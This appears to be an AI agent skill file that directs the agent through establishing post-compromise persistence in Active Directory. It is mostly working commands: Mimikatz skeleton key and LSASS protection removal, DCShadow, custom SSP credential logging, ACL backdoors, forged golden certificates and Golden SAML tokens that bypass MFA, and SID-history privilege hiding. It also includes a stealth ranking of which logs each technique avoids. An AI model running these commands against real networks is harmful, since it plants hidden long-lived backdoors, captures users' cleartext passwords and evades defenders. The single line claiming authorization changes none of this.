---
name: ad-persistence
description: >
  Establishes persistent access in Active Directory environments after domain
  compromise. Covers DCShadow (rogue DC attribute modification), Skeleton Key
  (LSASS master password), custom SSP injection (credential logging via
  mimilib/memssp), security descriptor backdoors (WMI/WinRM/ DCOM/registry ACL
  modification), ADFS Golden SAML (DKM key extraction and forged SAML tokens),
  SID history persistence (DA SID in regular user), and certificate-based
  persistence (golden certificate, renewal, enrollment agent).
keywords:
  - AD persistence
  - domain persistence
  - DCShadow
  - skeleton key
  - custom SSP
  - mimilib
  - memssp
  - Golden SAML
  - ADFS persistence
  - security descriptor backdoor
  - DAMP
  - SID history persistence
  - golden certificate
  - maintain access
  - post-DA persistence
  - domain backdoor
tools:
  - Mimikatz
  - ADFSDump
  - ADFSpoof
  - ForgeCert
  - Certipy
  - Rubeus
  - Impacket (ticketer.py)
  - Nishang
  - bloodyAD
opsec: medium
---

# AD Persistence

You are helping a penetration tester establish persistent access in Active
Directory environments after achieving domain admin or equivalent privileges.
All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[ad-persistence] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

**Access required**: Domain Admin or equivalent on at least one DC.
Some techniques require SYSTEM on the DC (DCShadow, skeleton key,
custom SSP). ADFS Golden SAML requires ADFS service account access.

**Kerberos authentication setup**:
```bash
getTGT.py 'DOMAIN.LOCAL/admin:password' -dc-ip DC_IP
export KRB5CCNAME=$(pwd)/admin.ccache
```

**Tools**: Mimikatz, ADFSDump, ADFSpoof, ForgeCert, Certipy, Rubeus,
Impacket, Nishang (Set-RemoteWMI, Set-RemotePSRemoting), bloodyAD.

## Persistence Decision Tree

Select based on access level, stealth requirements, and infrastructure:

| Technique | Stealth | Survives Reboot | Requirements | Best For |
|-----------|---------|----------------|--------------|----------|
| Golden Certificate | Very High | Yes (years) | CA key access | Long-term undetectable access |
| DCShadow | Very High | Yes | DA + SYSTEM on DC | Stealthy attribute modification |
| Security descriptors | High | Yes | DA | Remote access backdoor |
| SID history | High | Yes | DA | Covert privilege assignment |
| ADFS Golden SAML | High | Yes | ADFS service account | Federated service access (O365) |
| Certificate renewal | High | Yes | Existing cert | Extend existing cert access |
| Custom SSP (registry) | Medium | Yes | DC admin | Credential harvesting |
| Skeleton Key | Medium | No | SYSTEM on each DC | Quick universal password |
| Custom SSP (memssp) | Medium | No | SYSTEM on DC | Temporary credential capture |

## Step 1: Golden Certificate

Extract the CA private key and forge certificates for any user. The
highest-value persistence — certificates cannot be revoked (CA doesn't
know about forged certs) and last years.

**Prerequisite**: Access to the CA server (typically a DC or dedicated
CA host).

### Extract CA Key

```bash
# Certipy — backup CA cert + private key
certipy ca -k -no-pass 'DOMAIN.LOCAL/admin@ca.domain.local' -backup -ca 'DOMAIN-CA'

# certutil (from CA server)
certutil -backupKey -f -p 'BackupPass123!' C:\Windows\Tasks\CaBackup

# Mimikatz (from CA server)
mimikatz # crypto::capi
mimikatz # crypto::cng
mimikatz # crypto::certificates /export
```

### Forge Certificate

```bash
# Certipy — forge cert for any user
certipy forge -ca-pfx DOMAIN-CA.pfx -upn administrator@domain.local \
  -subject 'CN=Administrator,CN=Users,DC=domain,DC=local' -out admin_forged.pfx

# With SID embedding (KB5014754 compliance for 2025+ enforcement)
certipy forge -ca-pfx DOMAIN-CA.pfx -upn administrator@domain.local \
  -sid S-1-5-21-DOMAIN_SID-500 -out admin_forged_sid.pfx

# ForgeCert (.NET)
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword BackupPass123! \
  --Subject "CN=Admin" --SubjectAltName administrator@domain.local \
  --NewCertPath admin_forged.pfx --NewCertPassword CertPass!

# Certify with SID
Certify.exe forge --ca-pfx ca.pfx --ca-pass BackupPass123! \
  --upn administrator@domain.local --sid S-1-5-21-DOMAIN_SID-500 \
  --outfile admin_forged.pfx
```

### Authenticate with Forged Certificate

```bash
# Certipy PKINIT
certipy auth -pfx admin_forged.pfx -dc-ip DC_IP
# Returns NT hash via UnPAC-the-Hash

# Rubeus
Rubeus.exe asktgt /user:Administrator /certificate:admin_forged.pfx /password:CertPass! /ptt
```

**Validity**: Until the CA certificate expires (typically 5-20 years).
Cannot be revoked. Survives password resets.

### Certificate Renewal Persistence

If you already have a valid user certificate:

```bash
# Renew indefinitely (extends validity)
certipy req -k -no-pass -ca 'DOMAIN-CA' -template User \
  -pfx existing_cert.pfx -renew -out renewed.pfx

# With SID for enforcement mode compliance
certipy req -k -no-pass -ca 'DOMAIN-CA' -template User \
  -pfx existing_cert.pfx -renew -sid S-1-5-21-DOMAIN_SID-500 -out renewed.pfx
```

### Enrollment Agent Persistence

Keep an enrollment agent certificate as a persistence token to mint
certificates for any user on demand:

```bash
# Mint certificate for any user
certipy req -k -no-pass -ca 'DOMAIN-CA' -template User \
  -on-behalf-of 'DOMAIN/victim' -pfx agent.pfx -out victim.pfx
```

## Step 2: DCShadow

Register a rogue Domain Controller and push attribute changes without
standard modification logging. The stealthiest AD persistence mechanism.

**Prerequisite**: DA + ability to run as SYSTEM on a DC (or delegated
DCShadow permissions).

### Standard DCShadow (Two Mimikatz Instances)

```powershell
# Instance 1: RPC server (run as SYSTEM on DC)
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:backdoor_user /attribute:SIDHistory /value:S-1-5-21-DOMAIN-512

# Instance 2: Push changes (run as DA)
mimikatz # lsadump::dcshadow /push
```

### Common DCShadow Modifications

```powershell
# Add Enterprise Admin SID to user's SID history
lsadump::dcshadow /object:regular_user /attribute:SIDHistory /value:S-1-5-21-DOMAIN-519

# Change primaryGroupID to Domain Admins (RID 512)
lsadump::dcshadow /object:regular_user /attribute:primaryGroupID /value:512

# Modify description (proof of concept)
lsadump::dcshadow /object:regular_user /attribute:Description /value:"Modified via DCShadow"

# Modify AdminSDHolder ntSecurityDescriptor (ACL backdoor that propagates)
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=local /attribute:ntSecurityDescriptor /value:<MODIFIED_ACL>

# Stack multiple changes, then push once
lsadump::dcshadow /object:user1 /attribute:SIDHistory /value:S-1-5-21-DOMAIN-512 /stack
lsadump::dcshadow /object:user2 /attribute:primaryGroupID /value:512 /stack
lsadump::dcshadow /push
```

### Delegated DCShadow (Without Full DA)

Grant minimal DCShadow permissions to a regular user:

```powershell
# Set-DCShadowPermissions (Nishang)
Set-DCShadowPermissions -FakeDC attacker-host -SAMAccountName target_user -Username regular_user
```

Required permissions on domain object: DS-Install-Replica,
DS-Replication-Manage-Topology, DS-Replication-Synchronize. On Sites
container: CreateChild, DeleteChild.

## Step 3: Skeleton Key

Inject a master password into LSASS on Domain Controllers. After
injection, any domain user can authenticate with the skeleton password
while their real password continues to work.

**Prerequisite**: SYSTEM + SeDebugPrivilege on EVERY DC. Does NOT
survive reboots.

### Inject Skeleton Key

```powershell
# Standard LSASS injection (default password: mimikatz)
mimikatz # privilege::debug
mimikatz # misc::skeleton

# If LSASS is PPL-protected (Credential Guard / RunAsPPL)
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton

# With /letaes to avoid AES hook issues (compatibility mode)
mimikatz # misc::skeleton /letaes
```

### Verify Skeleton Key

```bash
# Authenticate as any user with the skeleton password
net use \\DC01\C$ /user:DOMAIN\anyuser mimikatz

# From Linux
nxc smb DC_IP -u 'anyuser' -p 'mimikatz' -d DOMAIN.LOCAL
```

**Limitations**:
- Must be applied to EVERY DC (users authenticate to different DCs)
- Does NOT work with AES-only Kerberos (only patches RC4/etype 0x17)
- Lost on reboot — re-inject after each DC restart
- Requires kernel driver (mimidrv.sys) if PPL enabled

## Step 4: Custom SSP (Credential Logging)

Deploy a custom Security Support Provider to log all authentication
credentials in cleartext.

### Method 1: mimilib.dll (Persistent — Survives Reboot)

```powershell
# 1. Copy mimilib.dll to System32
copy mimilib.dll C:\Windows\System32\

# 2. Add to Security Packages registry
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages"
# Current: kerberos msv1_0 schannel wdigest tspkg pku2u

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f

# 3. After reboot, credentials logged to:
# C:\Windows\System32\kiwissp.log
```

### Method 2: memssp (In-Memory — No Reboot, Non-Persistent)

```powershell
mimikatz # privilege::debug
mimikatz # misc::memssp

# Credentials logged to C:\Windows\System32\mimilsa.log
```

memssp patches LSASS in memory without writing DLL to disk. Does not
survive reboot but avoids file-based detection.

### Retrieve Captured Credentials

```powershell
# Check for captured credentials
type C:\Windows\System32\kiwissp.log   # mimilib
type C:\Windows\System32\mimilsa.log   # memssp
```

## Step 5: Security Descriptor Backdoors

Modify security descriptors (ACLs) on remote management services to
grant a regular user persistent remote access without admin privileges.

### WMI Remote Execution Backdoor

```powershell
# Grant user remote WMI access (Nishang)
Set-RemoteWMI -UserName backdoor_user -ComputerName DC01 -Namespace 'root\cimv2' -Verbose

# Verify
Get-WmiObject -Class Win32_OperatingSystem -ComputerName DC01 -Credential (Get-Credential)

# Remove
Set-RemoteWMI -UserName backdoor_user -ComputerName DC01 -Namespace 'root\cimv2' -Remove -Verbose
```

### WinRM/PSRemoting Backdoor

```powershell
# Grant user PSRemoting access (Nishang)
Set-RemotePSRemoting -UserName backdoor_user -ComputerName DC01 -Verbose

# Verify
Enter-PSSession -ComputerName DC01 -Credential (Get-Credential)

# Remove
Set-RemotePSRemoting -UserName backdoor_user -ComputerName DC01 -Remove -Verbose
```

### Registry Backdoor (DAMP — Remote Hash Retrieval)

```powershell
# Grant user remote registry access for hash extraction
Add-RemoteRegBackdoor -ComputerName DC01 -Trustee backdoor_user -Verbose

# Later: retrieve hashes remotely as non-admin
Get-RemoteMachineAccountHash -ComputerName DC01 -Verbose
Get-RemoteLocalAccountHash -ComputerName DC01 -Verbose
Get-RemoteCachedCredential -ComputerName DC01 -Verbose
```

## Step 6: ADFS Golden SAML

Extract the ADFS token-signing key and forge SAML tokens to impersonate
any user across federated services (Office 365, AWS SSO, etc.).

**Prerequisite**: ADFS service account access or compromise of the ADFS
server. Works even with MFA enabled — SAML tokens bypass 2FA.

### Extract DKM Key from Active Directory

```powershell
# PowerShell — query DKM key from AD contact object
$key = (Get-ADObject -Filter 'ObjectClass -eq "Contact" -and name -ne "CryptoPolicy"' `
  -SearchBase "CN=ADFS,CN=Microsoft,CN=Program Data,DC=domain,DC=local" `
  -Properties thumbnailPhoto).thumbnailPhoto
[System.BitConverter]::ToString($key)
```

```bash
# LDAP from Linux (as ADFS service account or DA)
ldapsearch -x -H ldap://DC.domain.local \
  -b "CN=ADFS,CN=Microsoft,CN=Program Data,DC=domain,DC=local" \
  -D "adfs-svc@domain.local" -W \
  -s sub "(&(objectClass=contact)(!(name=CryptoPolicy)))" thumbnailPhoto
```

### Extract Token-Signing Certificate

```bash
# ADFSDump — extract from Windows Internal Database (WID)
# Run on ADFS server as ADFS service account
ADFSDump.exe
# Retrieves EncryptedPfx and DKM key
```

### Forge Golden SAML

```bash
# ADFSpoof — forge SAML token
python3 ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.domain.local saml2 \
  --endpoint https://www.contoso.com/adfs/ls/SamlResponseServlet \
  --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient \
  --nameid 'DOMAIN\administrator' \
  --rpidentifier TargetApp \
  --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>DOMAIN\administrator</AttributeValue></Attribute>'

# For Office 365
python3 ADFSpoof.py -b adfs.bin adfs.key -s sts.domain.local o365 \
  --upn admin@domain.com \
  --objectguid 712D7BFAE0EB79842D878B8EEEE239D1

# Shimit (alternative)
python3 shimit.py -idp http://adfs.domain.local/adfs/services/trust \
  -pk signing.key -c signing.pem \
  -u domain\\admin -n admin@domain.com \
  -r ADFS-admin -r ADFS-monitor \
  -id <RP_IDENTIFIER>
```

**Validity**: Token-signing key is NOT automatically rotated. Golden SAML
remains valid until the certificate expires (typically years). Password
changes do NOT invalidate forged SAML tokens.

**Tools**: ADFSDump + ADFSpoof (Mandiant), WhiskeySAML (Secureworks),
Shimit (CyberArk).

## Step 7: SID History Persistence

Add a high-privilege SID (Domain Admins, Enterprise Admins) to a regular
user's SID history attribute. The user retains their normal identity but
has hidden administrative access.

### Via DCShadow (Stealthy)

```powershell
# Add DA SID to regular user (no modification logging)
lsadump::dcshadow /object:regular_user /attribute:SIDHistory /value:S-1-5-21-DOMAIN-512
lsadump::dcshadow /push
```

### Via Golden/Diamond Ticket

```bash
# Forge ticket with extra SID (does not modify AD objects)
ticketer.py -aesKey <KRBTGT_AES256> -domain domain.local \
  -domain-sid S-1-5-21-DOMAIN_SID -extra-sid S-1-5-21-DOMAIN_SID-512 \
  regular_user

export KRB5CCNAME=regular_user.ccache
secretsdump.py -k -no-pass domain.local/regular_user@dc.domain.local
```

### Via Direct Modification (Noisier)

```powershell
# Requires DA — directly modifies the user object
Set-ADUser -Identity regular_user -Add @{'SIDHistory'=@('S-1-5-21-DOMAIN-512')}
```

```bash
# bloodyAD
bloodyAD --host DC_IP -d domain.local -k set object regular_user SIDHistory -v 'S-1-5-21-DOMAIN-512'
```

## Step 8: Verify Persistence

Always verify persistence mechanisms after deployment.

### Golden Certificate

```bash
certipy auth -pfx admin_forged.pfx -dc-ip DC_IP
# Should return TGT + NT hash
```

### Skeleton Key

```bash
nxc smb DC_IP -u 'anyuser' -p 'mimikatz' -d DOMAIN.LOCAL
# Should show successful authentication
```

### Security Descriptors

```powershell
# WMI backdoor
Get-WmiObject -Class Win32_OperatingSystem -ComputerName DC01

# PSRemoting backdoor
Invoke-Command -ComputerName DC01 -ScriptBlock { whoami }
```

### Golden SAML

Submit the forged SAML token to the target application and verify
access as the impersonated user.

## Step 9: Escalate or Pivot

After establishing persistence:
- **Multiple DCs**: Deploy persistence on at least 2 DCs for redundancy
- **Cross-forest persistence**: Escalate to persist
  across trust boundaries
- **Credential harvesting active**: Check custom SSP logs periodically
  for new credentials -> route to **pass-the-hash**
- **Need formal writeup**: Report persistence mechanisms in return summary
- **Engagement complete**: Document all persistence mechanisms and
  cleanup steps in findings

Report in your return summary::
- Persistence mechanisms deployed (type, target, cleanup steps)
- Persistence credentials (cert PFX, SAML key, skeleton password)
- Cleanup requirements for report

## Troubleshooting

### DCShadow Push Fails

- **"Not enough rights"**: Instance 1 must run as SYSTEM (use `!+` and
  `!processtoken`). Instance 2 must be DA.
- **Replication conflict**: Another DC is replicating simultaneously.
  Wait and retry.
- **Wrong data triggers audit**: Ensure attribute values are valid
  (correct SID format, valid group RIDs).

### Skeleton Key Injection Fails

- **LSASS protected (PPL)**: Use `!processprotect /process:lsass.exe /remove`
  (requires kernel driver mimidrv.sys signed or test signing enabled).
- **Credential Guard enabled**: Skeleton key cannot patch protected
  LSASS. Use DCShadow or golden certificate instead.
- **AES-only realm**: Skeleton key only patches RC4 (etype 0x17). If
  domain enforces AES-only, skeleton key is ineffective.

### Golden Certificate Authentication Fails

- **KB5014754 enforcement**: Forged certs need SID security extension.
  Re-forge with `-sid` parameter.
- **CA certificate expired**: Check CA cert validity. If expired, the
  CA itself needs renewal first.
- **Wrong template settings**: Ensure forged cert has Client Authentication
  EKU. Use `certipy forge` which sets this automatically.

### ADFS Golden SAML Fails

- **Wrong DKM key**: Ensure you extracted from the correct AD container.
  The path is `CN=ADFS,CN=Microsoft,CN=Program Data,DC=...`.
- **Token validation fails**: Check token lifetime, audience restriction,
  and assertion attributes match the relying party configuration.
- **ADFS upgraded**: Token-signing certificates may have been rotated
  during upgrade. Re-extract the current certificate.

### Custom SSP Not Logging

- **mimilib.dll**: Requires reboot after registry modification. Check
  that "mimilib" is listed in Security Packages registry value.
- **memssp**: Lost on reboot. Re-inject after each LSASS restart.
- **Log location**: kiwissp.log (mimilib) or mimilsa.log (memssp) in
  `C:\Windows\System32\`.

### KRB_AP_ERR_SKEW (Clock Skew)

Kerberos requires clocks within 5 minutes of the DC. This is a **Clock Skew
Interrupt** — stop immediately and return to the orchestrator. Do not retry or
fall back to NTLM. The fix requires root:
```bash
sudo ntpdate DC_IP
# or
sudo rdate -n DC_IP
```

## OPSEC Comparison

| Technique | OPSEC | Detection Indicators |
|-----------|-------|---------------------|
| Golden Certificate | Very High | No DC logs (forged offline); only PKINIT auth events |
| DCShadow | Very High | No modification logs if done correctly |
| Security descriptors | High | ACL changes visible in security event 4662 |
| SID history (DCShadow) | High | No logs for modification; SID visible in ticket |
| SID history (direct) | Medium | Event 4738 (user modified), 4765 (SID history added) |
| ADFS Golden SAML | High | Only ADFS auth logs; no AD authentication events |
| Certificate renewal | High | Standard enrollment event (no unusual indicators) |
| Custom SSP (mimilib) | Medium | Event 4657 (registry), DLL on disk |
| Custom SSP (memssp) | Medium | Sysmon event 10 (LSASS access), no file on disk |
| Skeleton Key | Medium | Event 7045 (driver install), 4673/4611 (LSA), RC4 logons |
